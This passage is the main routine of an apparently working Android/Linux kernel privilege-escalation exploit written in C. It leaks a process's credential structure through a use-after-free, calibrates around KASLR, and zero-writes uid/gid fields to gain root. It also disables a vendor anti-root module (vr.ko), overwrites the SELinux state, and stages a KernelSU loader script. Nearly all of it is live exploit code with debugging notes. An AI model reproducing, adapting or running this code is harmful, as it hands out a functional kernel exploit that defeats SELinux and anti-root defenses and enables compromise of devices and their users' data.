    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;
    if (g_fake_stage && !fake_layout_supported())
    {
        logf("[-] fake cred layout not supported: uid=%#x cred=%#llx/%#llx\n",
             CRED_UID_OFF, (unsigned long long)CRED_REQ,
             (unsigned long long)CRED_ALLOC);
        return 1;
    }

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    (void)setpriority(PRIO_PROCESS, 0, -20);
    logf("[+] pid=%d cpu=%d nice=%d\n", getpid(), g_cpu,
         getpriority(PRIO_PROCESS, 0));
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
        return 1;
    if (ids_only)
    {
        /* Portable OS diag (no UAF, no plants, no zombies): sysinfo + slabinfo
         * + timer/cred/task trace histograms + base vote. Safe to run on any
         * 6.1/6.6/6.12 build to derive TIMER_SITE_LOW21, CRED_REQ/ALLOC,
         * COPY_PROCESS_LOW21, TASK_ALLOC_BYTES for target.h. */
        {
            struct utsname un;
            char vbuf[512] = {0};
            FILE *f;
            if (uname(&un) == 0)
                logf("[diag-sys] %s %s %s %s\n", un.sysname, un.release, un.version, un.machine);
            f = fopen("/proc/version", "r");
            if (f)
            {
                if (fgets(vbuf, sizeof(vbuf), f))
                    logf("[diag-sys] %s", vbuf);
                fclose(f);
            }
            f = fopen("/proc/slabinfo", "r");
            if (f)
            {
                char line[256];
                while (fgets(line, sizeof(line), f))
                {
                    if (!strncmp(line, "posix_timers_cache", 18) ||
                        !strncmp(line, "task_struct", 11) ||
                        !strncmp(line, "cred_jar", 8) ||
                        !strncmp(line, "kmalloc-192", 11) ||
                        !strncmp(line, "kmalloc-256", 11))
                        logf("[diag-slab] %s", line);
                }
                fclose(f);
            }
            f = fopen("/proc/sys/kernel/panic_on_warn", "r");
            if (f)
            {
                int pv = -1;
                if (fscanf(f, "%d", &pv) == 1)
                    logf("[diag-sys] panic_on_warn=%d\n", pv);
                fclose(f);
            }
            f = fopen("/sys/fs/selinux/enforce", "r");
            if (f)
            {
                char e = 0;
                if (fread(&e, 1, 1, f) == 1)
                    logf("[diag-sys] selinux_enforce=%c\n", e);
                fclose(f);
            }
            logf("[diag-sys] expect timer_low21=%#llx timer_alloc=%#llx cred_req=%#llx cred_alloc=%#llx task_low21=%#llx task_bytes=%#llx uid_off=%#llx task_cred=%#llx\n",
                 (unsigned long long)TIMER_SITE_LOW21, (unsigned long long)TIMER_ALLOC,
                 (unsigned long long)CRED_REQ, (unsigned long long)CRED_ALLOC,
                 (unsigned long long)COPY_PROCESS_LOW21, (unsigned long long)TASK_ALLOC_BYTES,
                 (unsigned long long)CRED_UID_OFF, (unsigned long long)OFF_TASK_CRED);
        }
        /* Timer probe: confirm the profile's call site and allocation size are
         * the ones this kernel really reports. */
        {
            int me = getpid();
            long n;
            int allocs = 0, matched = 0;
            unsigned long long ptrs[64];

            trace_start();
            for (int i = 0; i < 16; i++)
            {
                struct sigevent ev;
                timer_t t;
                memset(&ev, 0, sizeof(ev));
                ev.sigev_notify = SIGEV_NONE;
                if (timer_create(CLOCK_MONOTONIC, &ev, &t))
                    break;
            }
            usleep(3000);
            trace_stop();
            n = read_cpu(g_cpu, raw, 32u << 20);
            if (n > 0)
            {
                unsigned long long site = 0;

                allocs = scan_timer_allocs(raw, (size_t)n, me, ptrs, 64, &site);
                matched = allocs;
                logf("[diag] timer recs=%d expect site_low21=%#llx alloc=%#llx\n",
                     allocs, (unsigned long long)TIMER_SITE_LOW21,
                     (unsigned long long)TIMER_ALLOC);
            }
            logf("[diag] timer probe bytes=%ld pid=%d matched=%d\n", n, me,
                 matched);
        }
        /* Cred/task probe (no UAF, safe): one fork+exec captures the cred_jar
         * and task_struct allocations this build reports. */
        {
            int go[2] = {-1, -1}, st[2] = {-1, -1};
            pid_t p = -1;
            long n2 = 0;

            if (!pipe(go) && !pipe(st))
            {
                trace_start();
                p = fork();
                if (p == 0)
                {
                    int g2, s2;
                    char ch;

                    close(go[1]);
                    close(st[0]);
                    g2 = fcntl(go[0], F_DUPFD, 20);
                    s2 = fcntl(st[1], F_DUPFD, 20);
                    if (g2 < 0 || s2 < 0)
                        _exit(125);
                    close(go[0]);
                    close(st[1]);
                    dup2(g2, 3);
                    close(g2);
                    dup2(s2, 4);
                    close(s2);
                    pin(g_cpu);
                    if (read(3, &ch, 1) != 1)
                        _exit(126);
                    {
                        char *const av[] = {(char *)"/proc/self/exe", (char *)"wait", (char *)"verify", NULL};
                        char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                        execve("/proc/self/exe", av, ep);
                    }
                    _exit(127);
                }
                if (p > 0)
                {
                    unsigned long long cred = 0, task = 0;
                    unsigned long long site = 0;

                    close(go[0]);
                    close(st[1]);
                    if (write(go[1], "A", 1) == 1)
                        usleep(50000);
                    trace_stop();
                    n2 = read_cpu(g_cpu, raw, 48u << 20);
                    if (n2 > 0)
                    {
                        int cred_recs = scan_cred_allocs(raw, (size_t)n2, (int)p,
                                                         &site, &cred);
                        int task_recs = scan_task_allocs(raw, (size_t)n2, getpid(),
                                                         &task);

                        logf("[diag] cred recs=%d expect req=%#llx alloc=%#llx\n",
                             cred_recs, (unsigned long long)CRED_REQ,
                             (unsigned long long)CRED_ALLOC);
                        logf("[diag] task recs=%d expect low21=%#llx bytes=%#llx..%#llx\n",
                             task_recs, (unsigned long long)COPY_PROCESS_LOW21,
                             (unsigned long long)TASK_ALLOC_BYTES,
                             (unsigned long long)TASK_ALLOC_MAX);
                    }
                    logf("[diag] fork probe bytes=%ld pid=%d\n", n2, (int)p);
                    close(go[1]);
                    close(st[0]);
                    kill(p, SIGKILL);
                    waitpid(p, NULL, 0);
                }
                else
                {
                    close_pipe(go);
                    close_pipe(st);
                }
            }
            else
            {
                close_pipe(go);
                close_pipe(st);
            }
        }
        /* Base vote preview (safe, 512 allocs, no free/UAF). */
        {
            unsigned long long b = calibrate_base(raw);
            logf("[diag-base] preview best=%#llx\n", b);
        }
        return 0;
    }

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + CRED_UID_OFF);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    /* The stage script must be complete before the child can source it; a
     * partial write would only fail after the whole plant chain ran. */
    if (g_fake_stage && write_ksu_script() != 0)
    {
        logf("[-] cannot write /data/local/tmp/ksu_stage.sh\n");
        return 1;
    }
    if (g_fake_stage)
        logf("[+] fake endgame: KernelSU late-load via fake cred\n");
    if (ensure_pool() != 0)
        return 1;
    ensure_raw();

    if (!g_fake_stage)
    {
        int planted = 0;

        /* Direct cred write first: zero every uid/gid field (uid, suid, euid,
         * fsuid and their gid pairs) so the child is fully root WITHOUT
         * setuid(0), which would re-enter commit_creds and re-trigger vr.ko. */
        planted += zero_write(R + CRED_UID_OFF + 0x00, "cred uid/gid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x08, "cred suid/sgid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x10, "cred euid/egid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x18, "cred fsuid/fsgid", raw) == 0;
        logf("[+] cred zero-writes: %d/4 landed\n", planted);

        /* vr.ko anti-root LAST: strip the syscall-tracepoint work bit + tagA
         * (thread_info.flags word) right before waking the child. */
        if (g_child_task)
            defeat_vr(g_child_task, raw, C);
        else
            logf("[-] vr de-tag skipped: child task not leaked\n");

        if (planted != 4)
            park_forever("cred zero-write incomplete");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");

        /* vr.ko anti-root: clear thread_info.flags (0x400 work bit + tagA)
         * BEFORE the child becomes root via the fake cred, so vr's sys_exit
         * probe won't kill it (or the KernelSU worker it forks). */
        defeat_vr(g_child_task, raw, C);

        if (!g_slide)
            park_forever("no KASLR slide");

        memset(&fc, 0, sizeof(fc));
        /*
         * Point task->cred at the reclaimed page.  The fake cred starts at
         * the stale node address; rb_erase dirties uid/gid with the target,
         * so one zero write repairs them.  suid/sgid keep the rb_left
         * target; the fake cred's full CAP_SETUID and euid 0 make that
         * irrelevant for the fork/exec handoff.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                        "selinux", raw, NULL))
            park_forever("selinux write failed");
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
            park_forever("fake uid fix failed");
        /* 6.1 keeps a 4-byte usage, so euid lands on the erase target in c[2]
         * and needs its own zero write; 8-byte-usage layouts put euid in the
         * pair c[3] already clears. */
        if (CRED_UID_OFF == 4 &&
            stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL))
            park_forever("fake euid fix failed");
    }
    if (argc > 2 && !strcmp(argv[2], "safemode"))
        logf("[*] safemode ON: modules will be disabled natively pre-load\n");
    logf("[+] cred writes landed, waking child\n");

    /*
     * Wake the child and say exactly what happened.
     *
     * The old code wrote one byte and only logged "child wake write failed"
     * without a reason.  A pipe write can also come back short or EINTR, and
     * a failed wake means the child stays blocked in read(3) forever -- which
     * the parent then reports as a missing heartbeat, hiding the real cause.
     * EINTR/EAGAIN are retried; EPIPE and anything else is named.
     */
    {
        char wake = (argc > 2 && !strcmp(argv[2], "safemode")) ? 'S' : 'A';
        ssize_t wn;

        do
            wn = write(go_fd, &wake, 1);
        while (wn < 0 && (errno == EINTR || errno == EAGAIN));
        if (wn != 1)
        {
            int werr = errno;

            logf("[!] child wake write failed ret=%zd errno=%d (%s)\n", wn, werr,
                 werr == EPIPE ? "reader already gone"
                               : "child never saw the wake byte");
        }
    }
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t got = 0;
        /*
         * One deadline for the whole exchange.  The heartbeat arrives first
         * (the child writes it before doing any work); the report follows only
         * after the child finishes its escalation.  Treating the heartbeat as
         * a 5 s probe and then waiting for the report anyway made a child that
         * was merely starved look like a failed write.
         */
        long t_start = now_ms();
        long t_end = t_start + 30000;
        char hb = 0;
        ssize_t hn = 0;
        int eof = 0;
        int broken = 0;

        memset(&rep, 0, sizeof(rep));
        while (hn != 1 && now_ms() < t_end)
        {
            int pr = poll(&pf, 1, 200);

            if (pr < 0)
            {
                /* EINTR is transient; anything else means the fd is unusable
                 * and polling it again would spin at 100 % CPU. */
                if (errno == EINTR)
                    continue;
                broken = 1;
                break;
            }
            if (pr == 0)
                continue;
            hn = read(st_fd, &hb, 1);
            if (hn == 0)
            {
                eof = 1;
                break;
            }
            if (hn < 0 && errno != EINTR)
            {
                broken = 1;
                break;
            }
        }
        if (hn == 1 && hb == (char)0x48)
            logf("[+] child heartbeat: wake received\n");
        else if (eof)
            /*
             * EOF, not a timeout: every write end of the report pipe is
             * closed, so no byte can ever arrive.  Saying "no heartbeat" here
             * used to look like a slow child; it is a dead pipe, and the
             * child's own "heartbeat write failed errno=" line names why.
             */
            logf("[!] child report pipe closed before the heartbeat (n=0, EOF)\n");
        else if (broken)
            logf("[!] child report pipe unusable errno=%d\n", errno);
        else
            logf("[!] no child heartbeat within %ldms (pipe still open)\n",
                 now_ms() - t_start);
        while (hn == 1 && got < (ssize_t)sizeof(rep) && now_ms() < t_end)
        {
            int pr = poll(&pf, 1, 500);

            if (pr < 0)
            {
                if (errno == EINTR)
                    continue;
                break;
            }
            if (pr == 0)
                continue;
            {
                ssize_t rn = read(st_fd, (char *)&rep + got, sizeof(rep) - got);

                if (rn <= 0)
                    break;
                got += rn;
            }
        }
        close(st_fd);
        if (got == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            /*
             * A bad real uid is not cosmetic.  Across every recorded run the
             * two are perfectly correlated:
             *
             *     uid  euid  CapEff  outcome
             *     0    0     full    OK      (20 runs)
             *     -119 0     EMPTY   FAIL    (023944, 170424)
             *
             * uid==-119 is high32(A), the value rb_erase left in the cred, so
             * it names a lost `fake_uid` write.  The empty CapEff shows the
             * capability block did not survive the child's fork either, and
             * `id` rejects the bogus uid, so KernelSU never comes up.
             *
             * It cannot be repaired from here: setuid(0) re-enters
             * commit_creds, re-tags the task and lets vr.ko kill the child.
             * It is reported instead of retried, because the run is lost the
             * moment the fake_uid plant misses.
             */
            if (rep.uid != 0)
                logf("[!] fake_uid write lost: uid=%d (expected 0); this run "
                     "cannot root, reboot and retry\n", rep.uid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (got=%zd/%zu, heartbeat=%s)\n", got,
                 sizeof(rep), hn == 1 ? "yes" : "no");
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
        {
            /*
             * WIFEXITED/WIFSIGNALED: `status=0` alone cannot distinguish a
             * clean exit from one the child never performed, and a signal is
             * the one thing that explains a dead report pipe without a
             * matching "write failed" line from the child.
             */
            if (WIFSIGNALED(st))
                logf("[!] child killed by signal %d (%s)\n", WTERMSIG(st),
                     strsignal(WTERMSIG(st)));
            else
                logf("[+] child exit status=%d\n", WEXITSTATUS(st));
        }
    }
    if (g_fake_stage)
        park_expected("fake cred page held; reboot to clean");
    if (g_held)
        park_expected("root shell finished; failed-plant zombies are held");
    finish_run();
    logf("[+] done\n");
    return 0;
}
